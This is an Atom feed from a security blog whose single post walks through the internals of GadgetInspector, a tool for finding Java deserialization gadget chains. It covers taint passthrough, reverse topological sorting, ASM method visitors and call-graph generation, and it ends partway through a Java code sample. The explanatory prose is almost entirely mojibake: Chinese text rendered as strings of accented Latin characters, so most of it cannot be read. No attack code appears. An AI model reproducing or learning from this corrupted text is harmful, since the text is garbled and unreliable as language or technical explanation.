<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m0d9&#39;s blog</title>
  
  
  <link href="http://m0d9.me/atom.xml" rel="self"/>
  
  <link href="http://m0d9.me/"/>
  <updated>2022-10-21T08:03:32.056Z</updated>
  <id>http://m0d9.me/</id>
  
  <author>
    <name>m0d9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GadgetInspector å·¥å…·åˆ†æ</title>
    <link href="http://m0d9.me/2022/09/14/Tabby%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/09/14/Tabby%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</id>
    <published>2022-09-14T03:00:00.000Z</published>
    <updated>2022-10-21T08:03:32.056Z</updated>
    
    <content type="html"><![CDATA[<p>å¼€å§‹å•ƒéª¨å¤´äº†ã€‚ã€‚ã€‚</p><h2 id="0x01-èƒŒæ™¯çŸ¥è¯†"><a href="#0x01-èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="0x01 èƒŒæ™¯çŸ¥è¯†"></a>0x01 èƒŒæ™¯çŸ¥è¯†</h2><p>ä¸äº†è§£ç®—æ³•åŸç†åŸºç¡€ä¸Šï¼Œå»ç›´æ¥å•ƒGIæºç ï¼ŒçœŸçš„æ˜¯ä¸€ä»¶å¾ˆå›°éš¾çš„äº‹æƒ…ï¼Œéš¾å¾—æœ‰å¸ˆå‚…ä»¬çš„ç»éªŒæ€»ç»“ï¼Œç«™åœ¨å¸ˆå‚…ä»¬çš„è‚©è†€ä¸Šè®°å½•ä¸‹GIçš„å­¦ä¹ å¿ƒå¾—ã€‚</p><h3 id="æ—¶é—´çº¿"><a href="#æ—¶é—´çº¿" class="headerlink" title="æ—¶é—´çº¿"></a>æ—¶é—´çº¿</h3><ul><li>2018å¹´Black Hatå…¬å¸ƒ<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">GadgetInspector</a></li><li>2019å¹´Longofoå¸ˆå‚…<a href="https://paper.seebug.org/1034/#step2-passthrough_1">ã€ŠJava ååºåˆ—åŒ–å·¥å…· gadgetinspector åˆçª¥ã€‹</a>ï¼Œè¯¦ç»†è·Ÿè¸ªäº†é™¤ASMä¹‹å¤–çš„çŸ¥è¯†ç‚¹ï¼Œé‡ç‚¹æ˜¯é€†æ‹“æ‰‘æ’åº</li><li>2020å¹´threedr3am<a href="https://xz.aliyun.com/t/7058#toc-4">ã€Šjavaååºåˆ—åŒ–åˆ©ç”¨é“¾è‡ªåŠ¨æŒ–æ˜å·¥å…·gadgetinspectoræºç æµ…æã€‹</a>ï¼Œé‡ç‚¹åˆ†æäº†Longofoå¸ˆå‚…æœªæåˆ°çš„ASM</li><li>2022å¹´su18å¸ˆå‚…<a href="https://su18.org/post/gadgetor/">ã€Šé«˜æ•ˆæŒ–æ˜ååºåˆ—åŒ–æ¼æ´â€”â€”GadgetInspectoræ”¹é€ ã€‹</a>ï¼Œæåˆ°äº†GIçš„ä¸è¶³ä»¥åŠæ”¹è¿›æ€è·¯</li></ul><p>å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–çš„è®¸å¤šå¸ˆå‚…å…³äºGIçš„æ–‡ç« ï¼Œè¿™é‡Œæ²¡æœ‰æåˆ°ï¼Œä¸èµ˜è¿°ã€‚</p><a id="more"></a><h2 id="0x02-ç®—æ³•è§£æ"><a href="#0x02-ç®—æ³•è§£æ" class="headerlink" title="0x02 ç®—æ³•è§£æ"></a>0x02 ç®—æ³•è§£æ</h2><p>å…ˆæŠ›å¼€å¤æ‚çš„ä»£ç ï¼ŒGIçš„å·¥ä½œæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><ol><li>æšä¸¾å…¨éƒ¨ç±»ä»¥åŠæ¯ä¸ªç±»çš„æ‰€æœ‰æ–¹æ³•ï¼šMethodDiscovery</li><li>ç”Ÿæˆpassthroughæ•°æ®æµï¼šPassthroughDiscovery</li><li>æšä¸¾passthroughè°ƒç”¨å›¾ï¼šCallGraphDiscovery</li><li>æœç´¢å¯ç”¨çš„sourceï¼šSourceDiscovery</li><li>æœç´¢ç”Ÿæˆè°ƒç”¨é“¾ï¼šGadgetChainDiscovery</li></ol><p>å…¶ä¸­é‡ç‚¹çš„çŸ¥è¯†ç‚¹æœ‰ï¼š</p><ol><li>ASMæ ˆæ¨¡æ‹Ÿ</li><li>PassthroughDiscovery çš„å‡½æ•°é—´æ±¡ç‚¹ä¼ æ’­</li></ol><h3 id="2-1-MethodDiscovery"><a href="#2-1-MethodDiscovery" class="headerlink" title="2.1 MethodDiscovery"></a>2.1 MethodDiscovery</h3><p>æšä¸¾å…¨éƒ¨ç±»ä»¥åŠæ¯ä¸ªç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œä¿å­˜åœ¨classes.datã€methods.datä¸­ï¼Œåˆ†åˆ«å¯¹åº”ç±»ã€æ–¹æ³•ï¼Œç»“æ„å¦‚ä¸‹</p><p>classes.dat</p><table><thead><tr><th>å­—æ®µ</th><th>Demo</th></tr></thead><tbody><tr><td>ç±»å</td><td>com/m0d9/sec/AbstractTableModel</td></tr><tr><td>çˆ¶ç±»å</td><td>java/lang/Object</td></tr><tr><td>æ‰€æœ‰æ¥å£</td><td>java/io/Serializable</td></tr><tr><td>æ˜¯å¦æ˜¯æ¥å£</td><td>false</td></tr><tr><td>æˆå‘˜</td><td>__clojureFnMap!2!java/util/HashMap</td></tr></tbody></table><p>methods.dat</p><table><thead><tr><th>å­—æ®µ</th><th>Demo</th></tr></thead><tbody><tr><td>ç±»å</td><td>com/m0d9/sec/AbstractTableModel</td></tr><tr><td>æ–¹æ³•å</td><td>hashCode</td></tr><tr><td>æ–¹æ³•æè¿°ä¿¡æ¯</td><td>()I</td></tr><tr><td>æ˜¯å¦æ˜¯é™æ€æ–¹æ³•</td><td>false</td></tr></tbody></table><p>ç»§æ‰¿å…³ç³»è¡¨ï¼šinheritanceMap.dat</p><table><thead><tr><th>å­—æ®µ</th><th>Demo</th></tr></thead><tbody><tr><td>ç±»</td><td>com/m0d9/sec/AbstractTableModel</td></tr><tr><td>ç›´æ¥çˆ¶ç±»+é—´æ¥çˆ¶ç±»</td><td>java/lang/Objectã€java/io/Serializable</td></tr></tbody></table><p>å…¶ä¸­çš„å­—æ®µç»“æ„ï¼ŒLongofoå¸ˆå‚…æ–‡ç« é‡Œéƒ½æœ‰è§£é‡Šï¼Œè¿™é‡Œä¸èµ˜è¿°ã€‚</p><h3 id="2-2-PassthroughDiscovery"><a href="#2-2-PassthroughDiscovery" class="headerlink" title="2.2 PassthroughDiscovery"></a>2.2 PassthroughDiscovery</h3><p>ç”Ÿæˆpassthroughæ•°æ®æµï¼Œè¿™é‡Œæ¶‰åŠåˆ° é™æ€åˆ†æ-æ±¡ç‚¹åˆ†æ çš„çŸ¥è¯†ç‚¹äº†ï¼Œæ˜¯GIçš„ç¬¬ä¸€ä¸ªé‡ç‚¹çŸ¥è¯†ç‚¹ã€‚</p><p><img src="/images/pasted-261.png" alt="upload successful"></p><p>æœ€ç»ˆç”Ÿæˆçš„</p><p>passthrough.datï¼š</p><table><thead><tr><th>å­—æ®µ</th><th>Demo</th></tr></thead><tbody><tr><td>ç±»å</td><td>com/m0d9/sec/FnConstant</td></tr><tr><td>æ–¹æ³•å</td><td>invokeCall</td></tr><tr><td>æ–¹æ³•æè¿°</td><td>(Ljava/lang/Object;)Ljava/lang/Object;</td></tr><tr><td>æ±¡ç‚¹</td><td>0</td></tr></tbody></table><h4 id="2-2-1-ç»“æœè¡¨ç¤ºçº¦å®š"><a href="#2-2-1-ç»“æœè¡¨ç¤ºçº¦å®š" class="headerlink" title="2.2.1 ç»“æœè¡¨ç¤ºçº¦å®š"></a>2.2.1 ç»“æœè¡¨ç¤ºçº¦å®š</h4><p>ç®€å•æ¥è®²ï¼Œè¿™ä¸€æ­¥æ˜¯è®¡ç®—æ‰€æœ‰çš„æ–¹æ³•çš„æ±¡ç‚¹å‚æ•°æ±¡æ’­è§„åˆ™ã€‚</p><p>ä¾‹å¦‚ï¼šr = o.m(p0,â€¦)</p><p>æ³¨æ„è¿™é‡Œçš„å‰æï¼š</p><ul><li>åªè€ƒè™‘è¿”å›å€¼rçš„æ±¡æŸ“æƒ…å†µ</li></ul><p>é‚£ä¹ˆå’Œä»¥ä¸‹å› ç´ æœ‰å…³</p><ul><li>oï¼Œä¹Ÿå³è°ƒç”¨è€…ï¼Œåœ¨å‡½æ•°å†…éƒ¨ä¹Ÿå¯ä»¥ç†è§£ä¸ºthis</li><li>p0,â€¦ï¼Œå‚æ•°</li><li>mï¼Œæ–¹æ³•ï¼Œä¸ºä»€ä¹ˆæœ‰å…³ï¼Ÿå› ä¸ºå¤šæ€å’Œç»§æ‰¿ã€‚è¿™é‡Œè¿˜æ²¡è·Ÿè¸ªæ–‡ç« æ˜¯å¦‚ä½•å®ç°çš„ï¼Œå¾…è¡¥å……ã€‚</li></ul><p>å…·ä½“è§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœrå’Œoæœ‰å…³ï¼Œé‚£ä¹ˆæ„å‘³ç€rå¯ä»¥è¢«oæ±¡æŸ“ï¼Œåœ¨æ±¡ç‚¹å­—æ®µè®°ä¸º0</li><li>å¦‚ä½•rå’Œpæœ‰å…³ï¼Œé‚£ä¹ˆæ„å‘³ç€rå¯ä»¥è¢«å‚æ•°pæ±¡æŸ“ï¼Œå‚æ•°ä»1å¼€å§‹è®¡æ•°</li></ul><p>PPTä¸Šæœ‰æåˆ°å¦‚ä½•å®šä¹‰æœ‰å…³</p><ul><li>Assumption #1: All members of a â€œtaintedâ€ object are also tainted (and recursively, etc)</li><li>Assumption #2: All branch conditions are satisfiable</li></ul><blockquote><p>** æ€è€ƒ **</p><ol><li>å¦‚æœæ–¹æ³•å†…éƒ¨æœ‰è°ƒç”¨ï¼Œæ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Ÿç­”æ¡ˆæ˜¯é€†æ‹“æ‰‘æ’åºå’ŒASMç¨‹åºé—´æ±¡ç‚¹è·Ÿè¸ª</li></ol></blockquote><h4 id="2-2-2-é€†æ‹“æ‰‘æ’åº"><a href="#2-2-2-é€†æ‹“æ‰‘æ’åº" class="headerlink" title="2.2.2 é€†æ‹“æ‰‘æ’åº"></a>2.2.2 é€†æ‹“æ‰‘æ’åº</h4><p>ä¸ºäº†ä¿è¯æ­£åœ¨åˆ†æçš„å‡½æ•°ï¼Œå…¶å†…éƒ¨è°ƒç”¨çš„å‡½æ•°éƒ½æ˜¯åˆ†æè¿‡çš„ï¼Œæˆ–è€…æ— å…¶ä»–å†…éƒ¨å‡½æ•°ï¼Œéœ€è¦å¯¹methods è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼ŒLongofoå¸ˆå‚…è®²çš„å¾ˆä»”ç»†äº†ï¼Œè¿™é‡Œä¸èµ˜è¿°ï¼Œç›´æ¥å¼•ç”¨å¸ˆå‚…çš„ç»“è®ºã€‚</p><p>åŸå§‹çš„Call Graphï¼š</p><p><img src="/images/pasted-266.png" alt="upload successful"></p><p>ç”¨é€†æ‹“æ‰‘å±•å¼€æˆæ ‘çŠ¶ä¹‹åå¦‚ä¸‹</p><p><img src="/images/pasted-265.png" alt="upload successful"></p><p>æ’åºç»“æœä¸ºï¼šmed7ã€med8ã€med3ã€med6ã€med2ã€med4ã€med1ã€‚</p><p>è§£å†³çš„é—®é¢˜ï¼š</p><ol><li>é€šè¿‡é€†æ‹“æ‰‘æ’åºä¹‹åçš„ç»“æœï¼Œå¯ä»¥é¡ºåºè§£æï¼Œå¯¹åº”çš„æ˜¯ä»æ ‘ç»“æ„çš„æœ€åº•ç«¯è¿›è¡Œåˆ†æï¼Œä¸ä¼šå­˜åœ¨ä¾èµ–çš„èŠ‚ç‚¹æœªè§£æ</li><li>è§£å†³ç¯çš„é—®é¢˜</li></ol><p>ç”Ÿæˆè¿™å¼ å¤§é€†æ‹“æ‰‘æ’åºå›¾ä¹‹åï¼Œæ¥ç€å°±è¿›è¡Œéå†ï¼Œè®¡ç®—å…¶æ±¡ç‚¹ä¼ æ’­ã€‚</p><blockquote><p>ç–‘é—®ï¼šdfsTsort çš„å®ç°è²Œä¼¼æœ‰äº›é—®é¢˜ï¼Œä¸æ˜¯æ¯ä¸ªmethod éƒ½æœ‰ç”Ÿæˆpassthroughï¼Ÿ</p></blockquote><h4 id="2-2-3-è¿‡ç¨‹å†…æ±¡ç‚¹åˆ†æ"><a href="#2-2-3-è¿‡ç¨‹å†…æ±¡ç‚¹åˆ†æ" class="headerlink" title="2.2.3 è¿‡ç¨‹å†…æ±¡ç‚¹åˆ†æ"></a>2.2.3 è¿‡ç¨‹å†…æ±¡ç‚¹åˆ†æ</h4><p>è¿™å—threedr3amå¸ˆå‚…æœ‰è¯¦ç»†è®²è§£ï¼Œå…·ä½“åœ¨PassthroughDataflowMethodVisitor&amp; TaintTrackingMethodVisitor å†…ï¼Œè¿™é‡Œä¹Ÿåªæ˜¯ç®€è¦ç†è§£å…¶ç®—æ³•ã€‚</p><h5 id="ASM-Visitor"><a href="#ASM-Visitor" class="headerlink" title="ASM Visitor"></a>ASM Visitor</h5><p>CIæ˜¯ç”¨ASMæ¥æ¨¡æ‹Ÿæ–¹æ³•çš„è°ƒç”¨ï¼Œå…¥å‚ã€è¿”å›ï¼Œä»è€Œè¾¾åˆ°ç¨‹åºå†…æ±¡ç‚¹è·Ÿè¸ªã€‚</p><p>æ¥å£ç±»</p><ul><li><p>asm.ClassVisitor</p><ul><li>visit</li><li><strong>visitMethod</strong> : æŒ‡å®šmethodçš„ç›¸å…³æ“ä½œ</li><li>visitEnd</li><li>â€¦</li></ul></li><li><p>asm.MethodVisitor</p><ul><li>visitCodeï¼šåœ¨è¿›å…¥æ–¹æ³•çš„ç¬¬ä¸€æ—¶é—´ï¼ŒASMä¼šå…ˆè°ƒç”¨è¿™ä¸ªæ–¹æ³•</li><li>visitInsnï¼šåœ¨æ–¹æ³•ä½“ä¸­ï¼Œæ¯ä¸€ä¸ªå­—èŠ‚ç æ“ä½œæŒ‡ä»¤çš„æ‰§è¡Œï¼ŒASMéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•</li><li>visitFieldInsnï¼šå¯¹äºå­—æ®µçš„è°ƒç”¨ï¼ŒASMéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•</li><li><strong>visitMethodInsn</strong>ï¼šæ–¹æ³•ä½“å†…ï¼Œä¸€æ—¦è°ƒç”¨äº†å…¶ä»–æ–¹æ³•ï¼Œéƒ½ä¼šè§¦å‘è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨</li><li>visitVarInsnï¼šåœ¨æ–¹æ³•ä½“å†…å­—èŠ‚ç æ“ä½œå˜é‡æ—¶ï¼Œä¼šè¢«è°ƒç”¨</li></ul></li></ul><h5 id="ç®€å•ç†è§£"><a href="#ç®€å•ç†è§£" class="headerlink" title="ç®€å•ç†è§£"></a>ç®€å•ç†è§£</h5><p><strong>æŠ“ä½å…³é”®ç‚¹ï¼šåªå…³æ³¨ret ä¸thisã€å‚æ•°çš„å…³ç³»ï¼Œèƒ½å¦è¢«æ±¡æŸ“</strong> </p><ol><li><p>æŠŠTaintTrackingMethodVisitor å½“åšç”¨asmæ¨¡æ‹Ÿäº†jvmçš„æ‰§è¡Œè¿‡ç¨‹å³å¯ã€‚</p></li><li><p>åªéœ€è¦åˆ†æPassthroughDataflowMethodVisitor ä¸­å…³äºstackVarsã€localVarsçš„æ“ä½œï¼š</p><ul><li>visitCodeï¼Œå°†(0,p(this)=0),(1,p(arg1)),â€¦åŠ å…¥ä¸´æ—¶å˜é‡localVarsï¼Œå…¶ä¸­pä¸ºæ±¡ç‚¹å ä½</li><li>visitFieldInsnï¼Œå¦‚æœå½±å“this.fieldï¼Œåˆ™é€šè¿‡setStackTaint(0, taint) è®¾ç½®stackVarsæ±¡ç‚¹</li><li>visitMethodInsnï¼Œé€šè¿‡getStackTaint(retSize-1).addAll(resultTaint) è®¾ç½®stackVarsçš„æ±¡ç‚¹</li><li>visitInsn returnçš„æ—¶å€™ï¼Œå–å½“å‰æ ˆä¸Šçš„æœ€æ–°çš„ä¸ºæ±¡ç‚¹åˆ†æç»“æœã€‚</li></ul></li></ol><p>æ³¨æ„è¿™é‡Œ ï¼ŒstackVars ç”¨çš„ArrayListå®ç°çš„ï¼Œå› æ­¤pop å’Œpushçœ‹èµ·æ¥ä¼šæ¯”è¾ƒæ™¦æ¶©ï¼Œå¯ä»¥ç›´æ¥æŠŠstackVarså½“ä½œæ ˆæ¥çœ‹å¾…ï¼Œä¸è¿‡get è·å–çš„æ˜¯å€’è¿‡æ¥çš„å³å¯ã€‚<br>ä¾‹å¦‚visitMethodInsnä¸­çš„getStackTaint(retSize-1).addAll(resultTaint)ï¼Œå°±å¯ä»¥ç†è§£ä¸ºæŠŠæœ€æ–°çš„é‚£ä¸ªæ ˆå…ƒç´ é‡æ–°èµ‹å€¼ï¼Œè¿™æ ·ä¼šå¥½ç†è§£å¾ˆå¤šã€‚</p><!-- > **æ€è€ƒ**> 1. Newã€Assignã€Storeã€Load è¿™ä¸€è¿‡ç¨‹å†…çš„æ±¡ç‚¹ä¼ æ’­æ˜¯å®Œæ•´çš„å—ï¼Ÿç­”æ¡ˆä¸æ˜¯ï¼Œfeildå¤„ç†é‚£å—ï¼Œåˆä¸€ä¸ªtransient åˆ¤æ–­é€»è¾‘ï¼Œsu18å¸ˆå‚…æœ‰æåˆ°ï¼Œè¿™é‡Œä¹Ÿä¸è®²äº†ã€‚> 2. è¿‡ç¨‹é—´çš„æ±¡ç‚¹ä¼ æ’­æ˜¯å®Œæ•´çš„å—ï¼Ÿç­”æ¡ˆä¸æ˜¯ï¼Œå› ä¸ºåªè€ƒè™‘äº†è¿”å›å€¼æ±¡æŸ“ä¸å¦ï¼Œå‚æ•°ä¹Ÿå¯èƒ½è¢«æ±¡æŸ“ï¼Œè¿™ä¸ªç•™å¾…ä¹‹åTabbyå·¥å…·åˆ†æå†ç»†è®²ã€‚> 3. java é™æ€åˆ†æçš„åå°„éš¾ç‚¹æ˜¯å¦‚ä½•å¤„ç†çš„ï¼Ÿä¸ºä»€ä¹ˆè¯´æ˜¯ç®€åŒ–çš„è¿‡ç¨‹å†…æ±¡ç‚¹åˆ†æï¼Œå› ä¸ºè¿™é‡Œåªè€ƒè™‘äº†returnï¼Œæ²¡è€ƒè™‘thisã€å‚æ•°ï¼Œä¹Ÿæ²¡è€ƒè™‘ä¸Šä¸‹æ–‡ã€‚--><h3 id="2-3-CallGraphDiscovery"><a href="#2-3-CallGraphDiscovery" class="headerlink" title="2.3 CallGraphDiscovery"></a>2.3 CallGraphDiscovery</h3><blockquote><p>è¿™ä¸€æ­¥å’Œä¸Šä¸€æ­¥ç±»ä¼¼ï¼Œä½†æ£€æŸ¥çš„ä¸å†æ˜¯å‚æ•°ä¸è¿”å›ç»“æœçš„å…³ç³»ï¼Œè€Œæ˜¯æ–¹æ³•çš„ï¼Œå‚æ•°ä¸å…¶æ‰€è°ƒç”¨çš„å­æ–¹æ³•çš„å…³ç³»ï¼Œå³å­æ–¹æ³•çš„å‚æ•°æ˜¯å¦å¯ä»¥è¢«çˆ¶æ–¹æ³•çš„å‚æ•°æ‰€å½±å“ã€‚</p></blockquote><p>è¿™é‡Œå¼ºè°ƒä¸ªå¸ˆå‚…ä»¬æ²¡è®²çš„ç‚¹ï¼Œè™½ç„¶éƒ½æ˜¯éå†ï¼Œä½†æ˜¯æœ‰å¤„å¾ˆå¤§çš„ä¸åŒ</p><ul><li>PassthroughDiscovery æœ‰ä¸¤æ¬¡éå†<ul><li>éå†æ‰€æœ‰classçš„methodsï¼Œç”Ÿæˆé€†æ‹“æ‰‘å›¾</li><li>éå†é€†æ‹“æ‰‘å›¾ï¼Œç”Ÿæˆpassthrough</li></ul></li><li>CallGraphDiscovery åªæœ‰ä¸€æ¬¡éå†ï¼Œéå†çš„æ˜¯æ‰€æœ‰class</li></ul><p>ä¸¤æ¬¡æ–¹æ³• TaintTrackingMethodVisitoræ„é€ ä¸­ï¼ŒpassthroughDataflowå‚æ•°ä¸ä¸€æ ·ã€‚</p><p><img src="/images/pasted-270.png" alt="upload successful"></p><p><img src="/images/pasted-267.png" alt="upload successful"></p><p>callgraph.dat</p><table><thead><tr><th>å­—æ®µ</th><th>Demo</th></tr></thead><tbody><tr><td>çˆ¶æ–¹æ³•ç±»å</td><td>com/m0d9/sec/AbstractTableModel</td></tr><tr><td>çˆ¶æ–¹æ³•</td><td>hashCode</td></tr><tr><td>çˆ¶æ–¹æ³•æè¿°</td><td>()I</td></tr><tr><td>å­æ–¹æ³•ç±»å</td><td>com/m0d9/sec/IFn</td></tr><tr><td>å­æ–¹æ³•</td><td>invokeCall</td></tr><tr><td>å­æ–¹æ³•æè¿°</td><td>(Ljava/lang/Object;)Ljava/lang/Object;</td></tr><tr><td>çˆ¶æ–¹æ³•ç¬¬å‡ å‚</td><td>0</td></tr><tr><td>å‚æ•°å¯¹è±¡çš„å“ªä¸ªfieldè¢«ä¼ é€’</td><td>__clojureFnMap</td></tr><tr><td>å­æ–¹æ³•ç¬¬å‡ å‚</td><td>0</td></tr></tbody></table><blockquote><p>ä¸ºä»€ä¹ˆcallgraphéœ€è¦ç”¨åˆ°passthroughï¼Ÿä»£ç ä¸­CallGraphDiscovery ä¸­é™¤äº†ç»™TaintTrackingMethodVisitor ä¸­ç”¨åˆ°äº†ä¹‹å‰çš„passthrough ç»“æœï¼Œå°±æ²¡æœ‰å…¶ä»–åœ°æ–¹ç”¨åˆ°ã€‚çœ‹å¸ˆå‚…ä»¬æ–‡ç« ï¼Œéƒ½å¯¹è¿™é‡Œçš„è§£é‡Šéƒ½å¾ˆæ¨¡ç³Š</p></blockquote><h4 id="2-3-1-ASM-è¯¦ç»†æµç¨‹"><a href="#2-3-1-ASM-è¯¦ç»†æµç¨‹" class="headerlink" title="2.3.1 ASM è¯¦ç»†æµç¨‹"></a>2.3.1 ASM è¯¦ç»†æµç¨‹</h4><ul><li><p>localVars, æœ¬åœ°å˜é‡æ±¡æŸ“è¡¨ï¼ŒåŒ…å«thisã€å…¥å‚ã€ä»¥åŠå‡½æ•°ä¸­çš„å…¶ä»–ä¸´æ—¶å˜é‡ï¼Œç»“æ„ä¸º(idï¼Œtaint)ï¼Œæœ‰å¦‚ä¸‹æ¥å£ï¼š</p><ul><li>addï¼š</li><li>removeï¼š</li><li>getï¼š</li><li>setï¼š</li><li>setLocalTaintï¼šè®¾ç½®localå˜é‡ä¸­çš„æŸä¸ªå…ƒç´ </li><li>getLocalTaintï¼š</li></ul></li><li><p>stackVars æ¨¡æ‹Ÿçš„JVMæ ˆï¼Œç»“æœåŒæ ·ä¸º(idï¼Œtaint)ï¼Œæœ‰å¦‚ä¸‹æ¥å£ï¼š</p><ul><li>popï¼šå‡ºæ ˆ</li><li>pushï¼šå…¥æ ˆ</li><li>getStackTaintï¼šè·å–stackä¸­çš„æŸä¸ªå…ƒç´ </li><li>setStackTaintï¼šè®¾ç½®stackä¸­çš„æŸä¸ªå…ƒç´ </li><li>getï¼šå’ŒgetStackTaintç±»ä¼¼</li></ul></li></ul><h5 id="TaintTrackingMethodVisitor"><a href="#TaintTrackingMethodVisitor" class="headerlink" title="TaintTrackingMethodVisitor"></a>TaintTrackingMethodVisitor</h5><p>visitCode</p><pre><code>localVars å¢åŠ this, arg1, arg0, ...ï¼Œå†…å®¹æš‚æ—¶ä¸ºç©º</code></pre><p>visitVarInsn åœ¨æ–¹æ³•ä½“å†…å­—èŠ‚ç æ“ä½œå˜é‡æ—¶ï¼Œä¼šè¢«è°ƒç”¨</p><pre><code>Load å°†localVarsä¸­pushåˆ°stackSTORE å°†stackä¸­popå¹¶èµ‹å€¼ç»™LocalVars</code></pre><p>visitFieldInsn</p><pre><code>get    æ—¶pushå…¥æ ˆï¼Œç»“æœåœ¨stackVarsä¸­put æ—¶popå‡ºæ ˆ</code></pre><p>visitMethodInsn</p><pre><code>&gt; ç–‘é—®ï¼šæ­¤æ—¶å‚æ•°å·²ç»åœ¨æ ˆå†…äº†ï¼Œå“ªé‡Œå…¥æ ˆçš„ï¼Ÿæ˜¯LDC/DUPä¹‹ç±»æŒ‡ä»¤argTaintæ˜¯å‚æ•°çš„æ±¡ç‚¹è¡¨ï¼Œæ˜¯ä»æ ˆä¸­popå–å¾—resultTaint æ˜¯æœ€ç»ˆçš„è¿”å›å€¼æ±¡æŸ“æƒ…å†µå¦‚æœè¢«è°ƒç”¨çš„å‡½æ•°ä¸ºjava.io.ObjectInputStream#defaultReadObject, é‚£ä¹ˆlocalVars\[0\] è®¾ä¸ºargTaint\[0\]ï¼ŒlocalVars\[0\]æ˜¯thiså¦‚æœè¢«è°ƒç”¨å‡½æ•°åœ¨å†…ç½®çš„PASSTHROUGH_DATAFLOW ä¸­ï¼Œé‚£ä¹ˆresultTaint åŠ ä¸Šæ‰€æœ‰çš„æ±¡æŸ“ç‚¹idå¦‚æœè¢«è°ƒç”¨å‡½æ•°åœ¨passthroughDataflow ä¸­ï¼Œé‚£ä¹ˆåŒæ ·resultTaint åŠ ä¸Šæ‰€æœ‰çš„æ±¡æŸ“ç‚¹idå¦‚æœå‚æ•°0ï¼Œä¹Ÿå°±æ˜¯thisï¼Œæ˜¯java.util.Collection/java.util.Map æ¥å£çš„å®ç°ï¼Œé‚£ä¹ˆä¹Ÿè®¤ä¸ºargTaint\[0\]åŒ…å«æ‰€æœ‰çš„å‚æ•°æ±¡ç‚¹ï¼Œå¹¶ä¸”å¦‚æœè¿”å›å€¼æ˜¯returnçš„è¯ï¼Œé‚£ä¹ˆresultTaintä¹Ÿè¦åŠ å…¥è¿™äº›æ±¡ç‚¹å‚æ•°ã€‚æœ€åå°†resultTaint å…¥æ ˆ</code></pre><h5 id="PassthroughDataflowMethodVisitor"><a href="#PassthroughDataflowMethodVisitor" class="headerlink" title="PassthroughDataflowMethodVisitor"></a>PassthroughDataflowMethodVisitor</h5><p>visitCode<br>    localVars this, arg1, arg0, â€¦ä¸­èµ‹å€¼ï¼Œå€¼ä¸ºå½“å‰id</p><p>visitFieldInsn<br>    get GETFIELDæ—¶ï¼Œå¦‚æœæ˜¯éTransientï¼Œé‚£ä¹ˆå¯ä»¥å½“ä½œæ±¡ç‚¹ï¼ŒæŠŠåœ¨TaintTrackingMethodVisitorä¸­pushå…¥æ ˆçš„ç»“æœæ‰“ä¸Štaintæ ‡ï¼Œå†…å®¹ä¸º0ï¼ˆå› ä¸ºthis idä¸º0ï¼‰</p><p>visitMethodInsn<br>    å¯ä»¥å½“ä½œæ˜¯TaintTrackingMethodVisitorçš„è¡¥å……ï¼Œä¸°å¯ŒresultTaint<br>    å…·ä½“åšæ³•æ˜¯å¦‚æœæ˜¯æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆresultTaintå–ä¹‹ä¾èµ–thisï¼Œå¦åˆ™è¿˜æ˜¯è®¾æˆç©ºã€‚<br>    æ¥ç€è·å–è°ƒç”¨çš„å‡½æ•°çš„passthroughï¼Œè·å¾—å®ƒçš„return å’Œ å‚æ•°å…³ç³»ï¼Œç„¶åé€šè¿‡argTaintè·å–å‚æ•°çš„å®é™…æ±¡æŸ“æƒ…å†µï¼Œæœ€ç»ˆåŠ å…¥resultTaint<br>    æœ€åè°ƒç”¨çˆ¶ç±»çš„visitMethodInsnï¼Œå°†resultTaint åˆå¹¶</p><h5 id="CallGraph-ModelGeneratorMethodVisitor"><a href="#CallGraph-ModelGeneratorMethodVisitor" class="headerlink" title="CallGraph#ModelGeneratorMethodVisitor"></a>CallGraph#ModelGeneratorMethodVisitor</h5><p>visitCode<br>    localVars this, arg1, arg0, â€¦ä¸­èµ‹å€¼ï¼Œå€¼ä¸ºarg0ï¼Œarg1ï¼Œarg2â€¦</p><p>visitFieldInsn<br>    get GETFIELDæ—¶ï¼Œå¦‚æœæ˜¯éTransientï¼Œé‚£ä¹ˆå¯ä»¥å½“ä½œæ±¡ç‚¹ï¼ŒæŠŠåœ¨TaintTrackingMethodVisitorä¸­pushå…¥æ ˆçš„ç»“æœæ‰“ä¸Štaintæ ‡ï¼Œå†…å®¹ä¸ºfieldnameï¼Œå¦‚æœå·²ç»å­˜åœ¨ï¼Œåˆ™ç”¨.æ‹¼æ¥</p><p>visitMethodInsn<br>    å¯¹äºæ¯ä¸€ä¸ªå‚æ•°ï¼Œé€šè¿‡getStackTaint è·å–è¯¥çš„å‚æ•°çš„æ±¡ç‚¹ä¿¡æ¯ã€‚</p><h4 id="2-3-2-passthrough-gt-callgraph"><a href="#2-3-2-passthrough-gt-callgraph" class="headerlink" title="2.3.2 passthrough-&gt;callgraph"></a>2.3.2 passthrough-&gt;callgraph</h4><p>æœ‰äº†ä»¥ä¸Šçš„äº†è§£ï¼Œå†æ¥ç†è§£Lengoå¸ˆå‚…çš„ä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyObject obj;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parentMethod</span><span class="params">(Object arg)</span></span>&#123;</span><br><span 